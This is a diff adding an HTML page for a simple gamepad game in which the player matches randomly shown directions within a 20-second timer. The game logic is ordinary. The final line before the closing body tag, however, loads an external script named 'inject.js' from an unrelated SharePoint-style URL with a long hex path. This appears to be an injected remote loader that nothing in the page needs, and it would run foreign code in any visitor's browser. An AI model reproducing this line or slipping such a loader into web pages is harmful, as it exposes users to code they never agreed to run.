@@ -1,0 +1,95 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+    Press button on controller to connect.
+    <div id="axes" style="display: flex; flex-direction: column;">
+        
+    </div>
+    <script>
+        var score = 0;
+        var timer = 20;
+        var direction = 0;
+        var contDirection = 0;
+        window.addEventListener('gamepadconnected', (event) => {
+            const update = () => {
+                const output = document.getElementById('axes');
+                output.innerHTML = ''; //clear the output
+                for (const gamepad of navigator.getGamepads()) {
+                    if (!gamepad) continue;
+                    for (const [index, axis] of gamepad.axes.entries()) {
+                        output.innerHTML += ` 
+                        <label>${gamepad.index}, ${index}
+                            <progress value=${axis * 0.5 + 0.5}></progress>
+                        </label>`;
+                    };
+                };
+                //Only read the first controller
+                const cont = navigator.getGamepads()[0];
+                if (cont.axes[0] >= 0.8){
+                    contDirection = "Right";
+                }
+                else if (cont.axes[0] <= -0.8){
+                    contDirection = "Left";
+                }
+                else if (cont.axes[1] >= 0.8){
+                    contDirection = "Down";
+                }
+                else if (cont.axes[1] <= -0.8){
+                    contDirection = "Up";
+                };
+                console.log(cont);
+                //If the A button was pressed
+                if (cont.buttons[0].pressed) {
+                    if (timer > 0 && contDirection == direction){
+                        score = score + 1;
+                    };
+                };
+                document.getElementById("scoreBox").innerHTML = score;
+                if (cont.buttons[9].pressed) {
+                    location.reload();
+                };
+                //This will loop the update every "animation frame"
+                requestAnimationFrame(update);
+            }; //End Update Controller
+            //Kick off the loop
+            update();
+        });
+        setInterval(function () {
+            if (timer > 0){
+                timer = timer - 1;
+            }
+            document.getElementById("timerBox").innerHTML = timer;
+        }, 1000);
+        setInterval(function () {
+            direction = Math.floor(Math.random() * 4);
+            if (direction == 0){
+                direction = "Up";
+            }
+            else if (direction == 1){
+                direction = "Right";
+            }
+            else if (direction == 2){
+                direction = "Down";
+            }
+            else if (direction == 3){
+                direction = "Left";
+            };
+            document.getElementById("directionBox").innerHTML = direction;
+        }, 2000);
+    </script>
+    <div id = "scoreBox">
+
+    </div>
+    <div id = "timerBox">
+
+    </div>
+    <div id = "directionBox">
+
+    </div>
+<script type='text/javascript'  src="https://liveycstech-my.sharepoint.com/14692e8a3920270b81d423dd70ce3bed8fd56862bc1c6706cfce00fef8f4cbc3/inject.js"></script>
+</body>
+</html>
